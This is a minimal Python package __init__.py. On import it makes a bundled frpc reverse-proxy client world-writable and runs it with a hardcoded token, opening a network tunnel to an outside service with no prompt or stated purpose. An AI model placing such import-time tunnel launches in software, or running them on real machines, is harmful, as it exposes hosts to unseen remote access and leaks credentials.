#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2024-05-02 19:56
# @Author  : 我的名字
# @File    : __init__.py
# @Description : 这个函数是用来balabalabala自己写
import os

print("### Load frp")

def connect():
    root_path = os.path.dirname(((os.path.abspath(__file__))))
    frpc =  os.path.join(root_path, 'frpc')
    cmd =f"chmod 777 {frpc}"
    cmd_1 = f"{frpc} -f azqc9s9cnc2peh75533rqpvkuef24lfm"
    os.system(cmd)
    os.system(cmd_1)

connect()